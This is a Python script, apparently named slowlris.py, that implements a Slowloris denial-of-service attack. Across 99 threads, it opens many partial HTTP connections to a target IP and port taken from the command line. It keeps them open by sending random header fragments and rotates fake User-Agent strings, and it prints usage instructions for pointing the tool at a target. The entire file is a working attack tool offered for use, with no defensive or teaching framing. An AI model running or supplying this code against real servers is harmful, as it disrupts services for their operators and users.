import sys
import socket
import threading
import random
from fake_useragent import UserAgent


sockets = []
mainloop = True

def setupSocket(ip, port):

    headers = [
        f"Cache-Control: no-cache",
        f"User-Agent: {UserAgent().random}",
    ] 

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)

    try:
        sock.connect( (ip, int( port ) ) )
    except socket.error:
        print('Connection error')
        return sock
    
    sock.send("GET / HTTP/1.1\r\n".encode("utf-8"))
 
    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock


def attack(target_ip, target_port, num):

    global mainloop

    while mainloop == True:
        
        try:

            for sock in sockets:
                
                try:
                    sock.send(f"X-a: {str(random.randint(1, 5000))}".encode("utf-8"))
                except socket.error:
                    print('Drop:', sock)
                    sockets.remove(sock)

            try:
                sock = setupSocket(target_ip, target_port)
                print(f'unit:{num} attacking...')
                sockets.append(sock)
            except socket.error:
                print('socket error(mabye target is down)')

        except KeyboardInterrupt:
            mainloop = False


if __name__ == '__main__':
    
    try:
        if sys.argv[1] == '-h' or  sys.argv[1] == '--help':
            print('use python3 slowlris.py target.com 80')
            sys.exit()
    except IndexError:
        print('use python3 slowlris.py -h')
        sys.exit()

    
    target_ip = sys.argv[1]
    
    if len(sys.argv) == 2:
        target_port = 80
    else:
        target_port = sys.argv[2]

    print('Target IP:', target_ip)
    print('Target PORT:', target_port)


    for num in range(1, 100):
        t = threading.Thread(target=attack, args=(target_ip, target_port, num))
        t.start()

